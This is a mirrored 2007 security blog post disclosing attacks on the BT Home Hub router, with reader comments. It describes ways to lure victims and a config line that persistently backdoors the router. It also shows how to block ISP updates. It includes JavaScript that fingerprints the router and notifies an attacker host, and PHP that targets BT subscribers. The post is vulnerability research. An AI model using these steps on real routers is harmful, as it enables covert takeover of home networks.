@@ -1,0 +1,308 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-2/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:00:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (2)</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (2) Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Browser Rootkits' href='../browser-rootkits/index.html' />
+<link rel='next' title='GEO-tracking Mobile Phones' href='../geo-tracking-mobile-phones/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index3dea.html?p=513' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-513" class="post">
+	<div class="post-title"><h2><span>BT Home Flub: Pwnin the BT Home Hub (2)</span></h2></div>
+	<div class="post-date"><span>published:</span> October 16th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>In this post I&#8217;ll elaborate a bit more on our <a href="http://stage6.divx.com/user/gnucitizen/video/1722388/BT-Home-Flub">demo video</a> previously released and what the intruder can do to remotely access the Home Hub <em>anytime and from anywhere</em> after it&#8217;s been been broken into.  You are recommended to read the <a href="../bt-home-flub-pwnin-the-bt-home-hub/index.html">first part</a> of this post if you haven&#8217;t done so yet.</p>
+
+<p>So here is the attack illustrated in the demo video. The victim user is tricked &#8211; through Gtalk &#8211; to visit a website that contains malicious code. The malicious code runs in the background and does NOT exploit any vulnerabilities on the victim&#8217;s browser at all, neither does it rely on ActiveX, therefore it&#8217;s not picked up by anti-spyware/antivirus software. The malicious code is a simple combination of HTML and JavaScript, which exploits two vulnerabilities on the Home Hub (note that there are other vulnerabilities we found as well):</p>
+
+<ul>
+<li>CSRF</li>
+<li>Authentication bypass bug (thanks to this the exploit works even if the user has changed the default admin password)</li>
+</ul>
+
+<p>After the victim user visits the malicious website, he&#8217;s redirected to a funny video of <a href="http://www.google.com/search?ie=UTF-8&amp;oe=UTF-8&amp;sourceid=navclient&amp;gfns=1&amp;q=techno+viking">Techno Viking</a> hosted by Youtube. Thus, the victim is distracted away from the fact that his router has just been compromised. There are other things we could have done on the malicious website besides a redirect to a Youtube video. For instance, we could have simply embedded third-party content from other websites through iframes in order to distract the victim from the fact that he&#8217;s been victim of an attack.</p>
+
+<h3>Tricking the victim to visit the evil site</h3>
+
+<p>We&#8217;ve been asked by some non-technical users how would the intruder incite the victim to visit the malicious link. Malware criminals are experts at finding ways to attract people to their malicious websites. Well, there are plenty of examples we can give. The following are some:</p>
+
+<ul>
+<li>Through a chat conversation (i.e.: messenger or IRC)</li>
+<li>Through emails delivered in a mass fashion targeting <a href="http://mail.google.com/mail/help/intl/en-GB/googlemail.html">UK email addresses</a></li>
+<li>By placing the malicious link on a popular website where it&#8217;s common to find user-generated content. i.e.: Youtube, Myspace, Facebook, Bebo &#8230;</li>
+<li>Through a website that claims to offer free porn</li>
+<li>Through a website that claims to offer  free <a href="http://en.wikipedia.org/wiki/Warez">warez</a></li>
+<li>Black <a href="http://en.wikipedia.org/wiki/Search_engine_optimization">SEO</a></li>
+<li>By setting up a blog through which the audience is <a href="http://www.spamfighter.com/News_Read_Spamfighter.asp?UID=419">involved emotionally</a> regarding a current issue</li>
+</ul>
+
+<h3>Backdooring the Home Hub PERMANENTLY</h3>
+
+<p>Once the router has been compromised the attacker gets an email (as shown in the <a href="http://www.youtube.com/watch?v=i4tkM3UtF1Y">demo video</a>) with the URL needed to access the Home Hub remotely using the <q>tech support</q> account &#8211; a.k.a. remote assistance. The attacker then logs in using the username &#8216;tech&#8217; and a password which was chosen by her and was set when the malicious website was loaded in the victim user&#8217;s browser. At this point, the intruder can do anything to the router. For instance, because remote assistance gets disabled after 20 minutes of inactivity, the intruder can do the following in order to make sure that she can come back any time to the router to tamper with it:</p>
+
+<ul>
+<li>Save the Home Hub config file (contains all router settings including the passwords for any services the victim is subscribed to)</li>
+<li>Add the following line in the config file under the <code>[ servmgr.ini ]</code> section: <code>ifadd name=HTTPs group=wan</code></li>
+<li>Reload the modified config file so the new changes take place</li>
+<li>Configure the dynamic dns service (if the victim is not currently using it) using the web interface</li>
+</ul>
+
+<p>At this point, the intruder can come back anytime remotely to the Home Hub, even after the remote assistance connection has timed out (happens after 20 mins of inactivity by default). The credentials she would use to login are the same one that were set when the attack took place (username &#8216;tech&#8217; and a password of her choice). The cool thing is that although BT Broadband doesn&#8217;t support static IP addresses, the intruder can simply bypass this restriction and always find the victim router&#8217;s IP address thanks to it supporting serveral popular (and free) dynamic DNS services!</p>
+
+<h3>Detecting a potentially vulnerable router</h3>
+
+<p>When preparing the exploit shown in the video, the malicious code could do either of the following before the actual exploit is submitted to the router:</p>
+
+<ul>
+<li>do not check if the victim user uses a vulnerable router</li>
+<li>perform some sort of check that concludes with a significant probability whether the victim user&#8217;s router is vulnerable</li>
+</ul>
+
+<p>The first approach is typically followed by classic worms: the payload is executed no matter what. If the router is vulnerable, then it&#8217;ll be compromised, otherwise nothing would happen. From the user&#8217;s end, there is no difference as everything happens in the background.</p>
+
+<p>However, if the intruder wants to be stealth, he will craft the malicious webpage in such a way the exploit is only launched if the victim uses a potentially vulnerable router. This is a more elegant way to perform the attack and minimizes the chances of someone discovering the exploit and making it public.</p>
+
+<p>The following are two simple techniques that can be used. The first technique simply checks if the IP address used by the BT Home Hub is serving a certain image:</p>
+
+<pre><code>var notifyURL="http://evil.anydomain.com/bthomehubhack/notify.php";
+var imgsrc = 'http://192.168.1.254/images/head_wave.gif';
+var fingerprint_img = new Image();
+fingerprint_img.onerror = function (evt) {
+    ; // can't be loaded - couldn't find a vulnerable router
+}
+// only notify attacker if potential vulnerable Thomson Speedtouch / BT Homehub router found
+fingerprint_img.onload = function (evt) {
+    C=new Image();
+    C.src=notifyURL;
+}</code></pre>
+
+<p>The second technique simply checks for substrings within the <a href="http://en.wikipedia.org/wiki/Reverse_DNS_lookup">reverse DNS</a> (PTR record) of the victim router. The following is an example of a reverse DNS record used by a BT Home Hub:</p>
+
+<pre><code>host86-134-193-152.range86-134.btcentralplus.com</code></pre>
+
+<p>In PHP we could check for the string &#8216;btcentralplus.com&#8217; like this:</p>
+
+<pre><code>&lt;?php
+$ptr=gethostbyaddr($_SERVER[&apos;REMOTE_ADDR&apos;]);
+// if string &quot;btcentralplus.com&quot; is contained within victim&apos;s reverse lookup
+if(strstr($ptr, &quot;btcentralplus.com&quot;)) {
+   // then print exploit code
+   // EVIL CSRF/AUTH BYPASS CODE GOES HERE!
+}
+?&gt;</code></pre>
+
+<h3>Preventing BT from fixing the vulnerabilities on Hubs that have been owned</h3>
+
+<p>The BT Home Hub has a very neat feature called Auto-Update. The way the feature works is that the BT Home Hub connects regularly to remote servers located on <code>pbthdm.bt.motive.com</code>, which can push settings back to the Hub. There have been some concerns over this feature in the Internet community and I can see why. In essence, this feature is a backdoor which allows BT to do anything to your Home Hub remotely. Sure this is meant to be for updates that add new features and/or fix vulnerabilities. The question is, do you trust your ISP to have permanent control of your Internet gateway? I personally don&#8217;t like the possibility of a disgruntled BT employee being able to tamper with my Home Hub remotely! Not to mention that this feature has <a href="http://www.digitalspy.co.uk/forums/showthread.php?t=491560">bricked</a> Home Hubs in the past after customizing the configuration.</p>
+
+<p>An intruder would probably want to avoid any chance of BT disabling her backdoor after auto-updates are applied. Disabling updates can be as easy as changing the following line in the config file to point to a dummy (non-existing) URL. Note that we have NOT tested this idea, but it should work. After all, the intruder can save new changes in the config file using the tech support account.</p>
+
+<pre><code>server config url=<strong>https://useless-domain.foo/</strong> username=XXXXXXXXXXXXXXXXX password=XXXXXXXXXXXXXXXXX</code></pre>
+
+<p>Perhpaps, the most effective way in which a cracker can break into BT Home Hubs in a mass fashion is by compromising the autoupdate servers. Then, from there, one could push changes back to the Hubs&#8217; config files. Imagine someone updating all BT Home Hubs in the UK with remote HTTPs enabled and accessible with a password of her choice. What a botnet would that make! Scary.</p>
+  
+<h3>Credits where due</h3>
+
+<p><em><a href="../../about/pdp.html">pdp</a> and I would like to thank Jan Fry and Vijay Thakorlal for helping us testing attacks.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-59122">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bd59844b754ef4f8e7183faea98c115d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://http:/www.systemwebservice.ch/' rel='external nofollow' class='url'>sws</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59122">
+			October 17, 2007 at 11:12 am</a>		</div>
+
+		<p>Hey, so great this article. Is the BT Home Hub in United Kingdom so popular? Is this a hub from a TeleService hoster(like dsl, voip, etc..)?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-59161">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59161">
+			October 17, 2007 at 2:55 pm</a>		</div>
+
+		<p>Hi sws,</p>
+<p>Thanks for your kind words.</p>
+<p>If you go wardriving in the UK you&#8217;ll see that &#8220;BTHomeHub-XXXX&#8221; (where &#8216;X&#8217; is a hex digit) is probably the most popular SSID.</p>
+<p>The Hub is provided by BT and is in charge of other types of services besides broadband, such as VoIP (BT Broadband Talk), UMA telephony (BT Fusion), digital TV (BT Vision) and now FON.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-60655">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f4b6db86d7ce8755ea1a97838a87f89c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.offensivesecurity.org/' rel='external nofollow' class='url'>shrodikan</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-60655">
+			October 23, 2007 at 12:44 am</a>		</div>
+
+		<p>Hey PDP, I began reading your blog after I found a link to it from <a href="http://www.securityfocus.com/" rel="nofollow">http://www.securityfocus.com</a> (love your reports&#8211;very easy to read). I just wanted to say good job, they listened &#8212; <a href="http://www.vnunet.com/vnunet/news/2201737/bt-hamstrings-home-hub-hackers" rel="nofollow">http://www.vnunet.com/vnunet/n.....ub-hackers</a></p>
+<p>The world is a better place because of your research, keep up the good work!</p>
+<p>Peace,<br />
+shrodikan</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp odd alt thread-odd thread-alt depth-1" id="comment-60703">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-60703">
+			October 23, 2007 at 7:19 am</a>		</div>
+
+		<p>cheers bro</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-61161">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6c86d9e33a5de2089f3abe6792285079?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Pete</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-61161">
+			October 24, 2007 at 4:54 pm</a>		</div>
+
+		<p>Does the exploit work without having the BT Home Hub  admin browser window already open? If it does (which I assume) won&#8217;t the exploit pop up a browser window? Is this why distraction is required w/ the youtube video?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp odd alt thread-odd thread-alt depth-1" id="comment-61169">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-61169">
+			October 24, 2007 at 5:01 pm</a>		</div>
+
+		<p>Pete, the exploit is completely transparent. Nothing will happen. No browser windows will open. No warnings will warn you. Nothing!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="513"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="b0705ad73c" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-2/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:00:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
